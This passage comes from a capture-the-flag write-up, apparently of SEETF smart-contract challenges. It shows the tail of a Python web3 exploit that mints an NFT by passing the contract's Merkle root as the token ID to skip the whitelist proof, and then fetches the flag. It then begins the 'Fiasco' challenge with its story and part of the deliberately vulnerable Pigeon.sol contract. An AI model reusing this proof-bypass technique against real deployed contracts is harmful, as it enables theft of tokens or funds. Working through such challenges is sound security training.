class="s2">&#34;owner&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;address&#34;</span><span class="p">},{</span><span class="s2">&#34;internalType&#34;</span><span class="p">:</span><span class="s2">&#34;address&#34;</span><span class="p">,</span><span class="s2">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;operator&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;address&#34;</span><span class="p">}],</span><span class="s2">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;isApprovedForAll&#34;</span><span class="p">,</span><span class="s2">&#34;outputs&#34;</span><span class="p">:[{</span><span class="s2">&#34;internalType&#34;</span><span class="p">:</span><span class="s2">&#34;bool&#34;</span><span class="p">,</span><span class="s2">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;bool&#34;</span><span class="p">}],</span><span class="s2">&#34;stateMutability&#34;</span><span class="p">:</span><span class="s2">&#34;view&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;function&#34;</span><span class="p">},{</span><span class="s2">&#34;inputs&#34;</span><span class="p">:[{</span><span class="s2">&#34;internalType&#34;</span><span class="p">:</span><span class="s2">&#34;bytes32[]&#34;</span><span class="p">,</span><span class="s2">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;_proof&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;bytes32[]&#34;</span><span class="p">},{</span><span class="s2">&#34;internalType&#34;</span><span class="p">:</span><span class="s2">&#34;uint256&#34;</span><span class="p">,</span><span class="s2">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;_tokenId&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;uint256&#34;</span><span class="p">}],</span><span class="s2">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;mintSeePass&#34;</span><span class="p">,</span><span class="s2">&#34;outputs&#34;</span><span class="p">:[],</span><span class="s2">&#34;stateMutability&#34;</span><span class="p">:</span><span class="s2">&#34;nonpayable&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;function&#34;</span><span class="p">},{</span><span class="s2">&#34;inputs&#34;</span><span class="p">:[],</span><span class="s2">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;name&#34;</span><span class="p">,</span><span class="s2">&#34;outputs&#34;</span><span class="p">:[{</span><span class="s2">&#34;internalType&#34;</span><span class="p">:</span><span class="s2">&#34;string&#34;</span><span class="p">,</span><span class="s2">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;string&#34;</span><span class="p">}],</span><span class="s2">&#34;stateMutability&#34;</span><span class="p">:</span><span class="s2">&#34;view&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;function&#34;</span><span class="p">},{</span><span class="s2">&#34;inputs&#34;</span><span class="p">:[{</span><span class="s2">&#34;internalType&#34;</span><span class="p">:</span><span class="s2">&#34;uint256&#34;</span><span class="p">,</span><span class="s2">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;tokenId&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;uint256&#34;</span><span class="p">}],</span><span class="s2">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;ownerOf&#34;</span><span class="p">,</span><span class="s2">&#34;outputs&#34;</span><span class="p">:[{</span><span class="s2">&#34;internalType&#34;</span><span class="p">:</span><span class="s2">&#34;address&#34;</span><span class="p">,</span><span class="s2">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;address&#34;</span><span class="p">}],</span><span class="s2">&#34;stateMutability&#34;</span><span class="p">:</span><span class="s2">&#34;view&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;function&#34;</span><span class="p">},{</span><span class="s2">&#34;inputs&#34;</span><span class="p">:[{</span><span class="s2">&#34;internalType&#34;</span><span class="p">:</span><span class="s2">&#34;address&#34;</span><span class="p">,</span><span class="s2">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;from&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;address&#34;</span><span class="p">},{</span><span class="s2">&#34;internalType&#34;</span><span class="p">:</span><span class="s2">&#34;address&#34;</span><span class="p">,</span><span class="s2">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;to&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;address&#34;</span><span class="p">},{</span><span class="s2">&#34;internalType&#34;</span><span class="p">:</span><span class="s2">&#34;uint256&#34;</span><span class="p">,</span><span class="s2">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;tokenId&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;uint256&#34;</span><span class="p">}],</span><span class="s2">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;safeTransferFrom&#34;</span><span class="p">,</span><span class="s2">&#34;outputs&#34;</span><span class="p">:[],</span><span class="s2">&#34;stateMutability&#34;</span><span class="p">:</span><span class="s2">&#34;nonpayable&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;function&#34;</span><span class="p">},{</span><span class="s2">&#34;inputs&#34;</span><span class="p">:[{</span><span class="s2">&#34;internalType&#34;</span><span class="p">:</span><span class="s2">&#34;address&#34;</span><span class="p">,</span><span class="s2">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;from&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;address&#34;</span><span class="p">},{</span><span class="s2">&#34;internalType&#34;</span><span class="p">:</span><span class="s2">&#34;address&#34;</span><span class="p">,</span><span class="s2">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;to&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;address&#34;</span><span class="p">},{</span><span class="s2">&#34;internalType&#34;</span><span class="p">:</span><span class="s2">&#34;uint256&#34;</span><span class="p">,</span><span class="s2">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;tokenId&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;uint256&#34;</span><span class="p">},{</span><span class="s2">&#34;internalType&#34;</span><span class="p">:</span><span class="s2">&#34;bytes&#34;</span><span class="p">,</span><span class="s2">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;data&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;bytes&#34;</span><span class="p">}],</span><span class="s2">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;safeTransferFrom&#34;</span><span class="p">,</span><span class="s2">&#34;outputs&#34;</span><span class="p">:[],</span><span class="s2">&#34;stateMutability&#34;</span><span class="p">:</span><span class="s2">&#34;nonpayable&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;function&#34;</span><span class="p">},{</span><span class="s2">&#34;inputs&#34;</span><span class="p">:[{</span><span class="s2">&#34;internalType&#34;</span><span class="p">:</span><span class="s2">&#34;address&#34;</span><span class="p">,</span><span class="s2">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;operator&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;address&#34;</span><span class="p">},{</span><span class="s2">&#34;internalType&#34;</span><span class="p">:</span><span class="s2">&#34;bool&#34;</span><span class="p">,</span><span class="s2">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;approved&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;bool&#34;</span><span class="p">}],</span><span class="s2">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;setApprovalForAll&#34;</span><span class="p">,</span><span class="s2">&#34;outputs&#34;</span><span class="p">:[],</span><span class="s2">&#34;stateMutability&#34;</span><span class="p">:</span><span class="s2">&#34;nonpayable&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;function&#34;</span><span class="p">},{</span><span class="s2">&#34;inputs&#34;</span><span class="p">:[{</span><span class="s2">&#34;internalType&#34;</span><span class="p">:</span><span class="s2">&#34;bytes4&#34;</span><span class="p">,</span><span class="s2">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;interfaceId&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;bytes4&#34;</span><span class="p">}],</span><span class="s2">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;supportsInterface&#34;</span><span class="p">,</span><span class="s2">&#34;outputs&#34;</span><span class="p">:[{</span><span class="s2">&#34;internalType&#34;</span><span class="p">:</span><span class="s2">&#34;bool&#34;</span><span class="p">,</span><span class="s2">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;bool&#34;</span><span class="p">}],</span><span class="s2">&#34;stateMutability&#34;</span><span class="p">:</span><span class="s2">&#34;view&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;function&#34;</span><span class="p">},{</span><span class="s2">&#34;inputs&#34;</span><span class="p">:[],</span><span class="s2">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;symbol&#34;</span><span class="p">,</span><span class="s2">&#34;outputs&#34;</span><span class="p">:[{</span><span class="s2">&#34;internalType&#34;</span><span class="p">:</span><span class="s2">&#34;string&#34;</span><span class="p">,</span><span class="s2">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;string&#34;</span><span class="p">}],</span><span class="s2">&#34;stateMutability&#34;</span><span class="p">:</span><span class="s2">&#34;view&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;function&#34;</span><span class="p">},{</span><span class="s2">&#34;inputs&#34;</span><span class="p">:[{</span><span class="s2">&#34;internalType&#34;</span><span class="p">:</span><span class="s2">&#34;uint256&#34;</span><span class="p">,</span><span class="s2">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;tokenId&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;uint256&#34;</span><span class="p">}],</span><span class="s2">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;tokenURI&#34;</span><span class="p">,</span><span class="s2">&#34;outputs&#34;</span><span class="p">:[{</span><span class="s2">&#34;internalType&#34;</span><span class="p">:</span><span class="s2">&#34;string&#34;</span><span class="p">,</span><span class="s2">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;string&#34;</span><span class="p">}],</span><span class="s2">&#34;stateMutability&#34;</span><span class="p">:</span><span class="s2">&#34;view&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;function&#34;</span><span class="p">},{</span><span class="s2">&#34;inputs&#34;</span><span class="p">:[{</span><span class="s2">&#34;internalType&#34;</span><span class="p">:</span><span class="s2">&#34;address&#34;</span><span class="p">,</span><span class="s2">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;from&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;address&#34;</span><span class="p">},{</span><span class="s2">&#34;internalType&#34;</span><span class="p">:</span><span class="s2">&#34;address&#34;</span><span class="p">,</span><span class="s2">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;to&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;address&#34;</span><span class="p">},{</span><span class="s2">&#34;internalType&#34;</span><span class="p">:</span><span class="s2">&#34;uint256&#34;</span><span class="p">,</span><span class="s2">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;tokenId&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;uint256&#34;</span><span class="p">}],</span><span class="s2">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;transferFrom&#34;</span><span class="p">,</span><span class="s2">&#34;outputs&#34;</span><span class="p">:[],</span><span class="s2">&#34;stateMutability&#34;</span><span class="p">:</span><span class="s2">&#34;nonpayable&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;function&#34;</span><span class="p">},{</span><span class="s2">&#34;inputs&#34;</span><span class="p">:[{</span><span class="s2">&#34;internalType&#34;</span><span class="p">:</span><span class="s2">&#34;bytes32[]&#34;</span><span class="p">,</span><span class="s2">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;proof&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;bytes32[]&#34;</span><span class="p">},{</span><span class="s2">&#34;internalType&#34;</span><span class="p">:</span><span class="s2">&#34;bytes32&#34;</span><span class="p">,</span><span class="s2">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;root&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;bytes32&#34;</span><span class="p">},{</span><span class="s2">&#34;internalType&#34;</span><span class="p">:</span><span class="s2">&#34;uint256&#34;</span><span class="p">,</span><span class="s2">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;index&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;uint256&#34;</span><span class="p">}],</span><span class="s2">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;verify&#34;</span><span class="p">,</span><span class="s2">&#34;outputs&#34;</span><span class="p">:[{</span><span class="s2">&#34;internalType&#34;</span><span class="p">:</span><span class="s2">&#34;bool&#34;</span><span class="p">,</span><span class="s2">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;bool&#34;</span><span class="p">}],</span><span class="s2">&#34;stateMutability&#34;</span><span class="p">:</span><span class="s2">&#34;pure&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;function&#34;</span><span class="p">}]</span>
</span></span><span class="line"><span class="cl"><span class="n">seepass_contract</span> <span class="o">=</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">contract</span><span class="p">(</span><span class="n">address</span><span class="o">=</span><span class="n">seepass_address</span><span class="p">,</span> <span class="n">abi</span><span class="o">=</span><span class="n">seepass_abi</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">merkle_root</span> <span class="o">=</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">get_storage_at</span><span class="p">(</span><span class="n">seepass_address</span><span class="p">,</span> <span class="mi">6</span><span class="p">)</span><span class="o">.</span><span class="n">hex</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;Merkle root    : </span><span class="si">{</span><span class="n">merkle_root</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># We can simply use the merkle root as uint256 index to mint our first NFT.</span>
</span></span><span class="line"><span class="cl"><span class="n">transaction</span> <span class="o">=</span> <span class="n">seepass_contract</span><span class="o">.</span><span class="n">functions</span><span class="o">.</span><span class="n">mintSeePass</span><span class="p">([],</span> <span class="nb">int</span><span class="p">(</span><span class="n">merkle_root</span><span class="p">,</span> <span class="mi">16</span><span class="p">))</span><span class="o">.</span><span class="n">build_transaction</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;from&#39;</span><span class="p">:</span> <span class="n">player</span><span class="o">.</span><span class="n">address</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;nonce&#39;</span><span class="p">:</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">get_transaction_count</span><span class="p">(</span><span class="n">player</span><span class="o">.</span><span class="n">address</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;gasPrice&#39;</span><span class="p">:</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">gas_price</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;value&#39;</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;chainId&#39;</span><span class="p">:</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">chain_id</span>
</span></span><span class="line"><span class="cl"><span class="p">})</span>
</span></span><span class="line"><span class="cl"><span class="n">signed_transaction</span> <span class="o">=</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">account</span><span class="o">.</span><span class="n">sign_transaction</span><span class="p">(</span><span class="n">transaction</span><span class="p">,</span> <span class="n">private_key</span><span class="o">=</span><span class="n">private_key</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">transaction_hash</span> <span class="o">=</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">send_raw_transaction</span><span class="p">(</span><span class="n">signed_transaction</span><span class="o">.</span><span class="n">rawTransaction</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Transaction Hash:&#34;</span><span class="p">,</span> <span class="n">transaction_hash</span><span class="o">.</span><span class="n">hex</span><span class="p">())</span>
</span></span><span class="line"><span class="cl"><span class="n">sleep</span><span class="p">(</span><span class="mi">15</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Get flag</span>
</span></span><span class="line"><span class="cl"><span class="n">out</span> <span class="o">=</span> <span class="n">get_flag</span><span class="p">(</span><span class="n">uuid</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">info</span><span class="p">(</span><span class="n">out</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="details admonition note open">
        <div class="details-summary admonition-title">
            <i class="icon fas fa-pencil-alt fa-fw" aria-hidden="true"></i>Note<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
        </div>
        <div class="details-content">
            <div class="admonition-content">To get the <code>abi</code>, I manually compiled the contract with <code>solc</code> in my local + init a <code>foundry</code> project to handle the contract dependencies to <code>open-zeppelin</code>.</div>
        </div>
    </div>
<blockquote>
<p><strong>Flag: SEE{w3lc0me_t0_dA_NFT_w0rld_w1th_SE3pAs5_f3a794cf4f4dd14f9cc7f6a25f61e232}</strong></p>
</blockquote>
<h2 id="fiasco">Fiasco</h2>
<div class="details admonition quote open">
        <div class="details-summary admonition-title">
            <i class="icon fas fa-quote-right fa-fw" aria-hidden="true"></i>Description<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
        </div>
        <div class="details-content">
            <div class="admonition-content"><p>In the dystopian digital landscape of the near future, a cunning mastermind has kickstarted his plan for ultimate dominance by creating an army of robotic pigeons. These pigeons, six in the beginning, are given a sinister mission: to spy on the public, their focus being on individuals amassing significant Ethereum (ETH) holdings.</p>
<p>Each pigeon has been tasked with documenting the ETH each person owns, planning for a future operation to swoop in and siphon off these digital assets. The robotic pigeons, however, are not just spies, but also consumers. They are provided with ETH by their creator to cover their operational expenses, making the network of spy birds self-sustaining and increasingly dangerous.</p>
<p>The army operates on a merit-based system, where the pigeon agents earn points for their successful missions. These points pave their path towards promotion, allowing them to ascend the ranks of the robotic army. But, the journey up isn&rsquo;t free. They must return the earned ETH back to their master for their promotion.</p>
<p>Despite the regimented system, the robotic pigeons have a choice. They can choose to desert the army at any point, taking with them the ETH they&rsquo;ve earned. Will they remain loyal, or will they break free?</p>
</div>
        </div>
    </div>
<h3 id="initial-analysis-1">Initial Analysis</h3>
<p>In this challenge, we were given two solidity files. Let&rsquo;s check it first.</p>
<p><strong>Pigeon.sol</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span><span class="lnt">127
</span><span class="lnt">128
</span><span class="lnt">129
</span><span class="lnt">130
</span><span class="lnt">131
</span><span class="lnt">132
</span><span class="lnt">133
</span><span class="lnt">134
</span><span class="lnt">135
</span><span class="lnt">136
</span><span class="lnt">137
</span><span class="lnt">138
</span><span class="lnt">139
</span><span class="lnt">140
</span><span class="lnt">141
</span><span class="lnt">142
</span><span class="lnt">143
</span><span class="lnt">144
</span><span class="lnt">145
</span><span class="lnt">146
</span><span class="lnt">147
</span><span class="lnt">148
</span><span class="lnt">149
</span><span class="lnt">150
</span><span class="lnt">151
</span><span class="lnt">152
</span><span class="lnt">153
</span><span class="lnt">154
</span><span class="lnt">155
</span><span class="lnt">156
</span><span class="lnt">157
</span><span class="lnt">158
</span><span class="lnt">159
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="c1">// SPDX-License-Identifier: UNLICENSED
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">pragma solidity</span> <span class="o">&gt;=</span><span class="mi">0</span><span class="p">.</span><span class="mi">8</span><span class="p">.</span><span class="mi">17</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">contract</span> <span class="nc">Pigeon</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">address</span> <span class="k">private</span> <span class="n">owner</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">uint256</span> <span class="k">private</span> <span class="n">ownerBalance</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">uint256</span> <span class="k">private</span> <span class="n">juniorPromotion</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">uint256</span> <span class="k">private</span> <span class="n">associatePromotion</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">mapping</span><span class="p">(</span><span class="kt">bytes32</span> <span class="o">=&gt;</span> <span class="kt">address</span><span class="p">)</span> <span class="k">private</span> <span class="n">seniorPigeon</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kd">mapping</span><span class="p">(</span><span class="kt">bytes32</span> <span class="o">=&gt;</span> <span class="kt">address</span><span class="p">)</span> <span class="k">private</span> <span class="n">associatePigeon</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kd">mapping</span><span class="p">(</span><span class="kt">bytes32</span> <span class="o">=&gt;</span> <span class="kt">address</span><span class="p">)</span> <span class="k">private</span> <span class="n">juniorPigeon</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kd">mapping</span><span class="p">(</span><span class="kt">address</span> <span class="o">=&gt;</span> <span class="kt">bool</span><span class="p">)</span> <span class="k">private</span> <span class="n">isPigeon</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kd">mapping</span><span class="p">(</span><span class="kt">string</span> <span class="o">=&gt;</span> <span class="kd">mapping</span><span class="p">(</span><span class="kt">string</span> <span class="o">=&gt;</span> <span class="kt">bool</span><span class="p">))</span> <span class="k">private</span> <span class="n">codeToName</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kd">mapping</span><span class="p">(</span><span class="kt">bytes32</span> <span class="o">=&gt;</span> <span class="kt">uint256</span><span class="p">)</span> <span class="k">private</span> <span class="n">taskPoints</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">mapping</span><span class="p">(</span><span class="kt">address</span> <span class="o">=&gt;</span> <span class="kd">mapping</span><span class="p">(</span><span class="kt">address</span> <span class="o">=&gt;</span> <span class="kt">uint256</span><span class="p">))</span> <span class="k">private</span> <span class="n">dataCollection</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kd">mapping</span><span class="p">(</span><span class="kt">address</span> <span class="o">=&gt;</span> <span class="kt">bool</span><span class="p">)</span> <span class="k">private</span> <span class="n">hasBeenCollected</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kd">mapping</span><span class="p">(</span><span class="kt">bytes32</span> <span class="o">=&gt;</span> <span class="kt">uint256</span><span class="p">)</span> <span class="k">private</span> <span class="n">treasury</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">modifier</span> <span class="nf">onlyOwner</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">owner</span> <span class="o">!=</span> <span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">)</span> <span class="nb">revert</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="k">_</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">modifier</span> <span class="nf">oneOfUs</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">isPigeon</span><span class="p">[</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">])</span> <span class="nb">revert</span><span class="p">();</span>
